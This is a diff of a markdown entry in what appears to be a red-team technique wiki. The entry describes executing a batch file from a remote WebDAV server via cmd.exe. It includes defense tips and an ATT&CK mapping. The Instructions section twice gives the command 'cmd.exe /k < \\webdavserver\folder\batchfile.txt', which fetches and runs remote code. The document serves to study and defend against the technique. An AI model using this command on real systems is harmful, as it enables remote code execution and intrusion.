@@ -39,11 +39,15 @@ To execute this technique, the attacker first needs to upload a batch file to a 
 
 For businesses, this technique highlights the need for strong security controls and monitoring of network traffic to detect and prevent malicious activity.
 
+ 
+
 ## Requirements
 
 1. Access to a WebDAV server
 
 1. Command prompt access
+
+ 
 
 ## Defense
 
@@ -53,23 +57,37 @@ For businesses, this technique highlights the need for strong security controls 
 
 1. Use antivirus and endpoint protection software to detect and prevent malicious code execution
 
+ 
+
 ## Objectives
 
 1. Download and execute a batch file from a WebDAV server
+
+ 
 
 # Instructions
 
 1. To execute a batch file from a WebDAV server, use the following command:
 
+ 
+
+
+
 **Code**: [[cmd.exe /k < \\webdavserver\folder\batchfile.txt]]
 
+
+
 > This command will open a command prompt and execute a batch file located on a WebDAV server. The '/k' option will keep the command prompt window open after the batch file has finished executing. The '\\webdavserver\folder\batchfile.txt' argument specifies the location of the batch file on the WebDAV server. Make sure to replace 'webdavserver' with the name of your WebDAV server and 'folder' with the name of the folder where the batch file is located.
+
+
 
 **Command** ([[Execute Batch File]]):
 
 ```bash
 cmd.exe /k < \\webdavserver\folder\batchfile.txt
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -93,3 +111,5 @@ cmd.exe /k < \\webdavserver\folder\batchfile.txt
 
 - [[Cmd]]
 - [[Windows - Download and execute methods]]
+
+
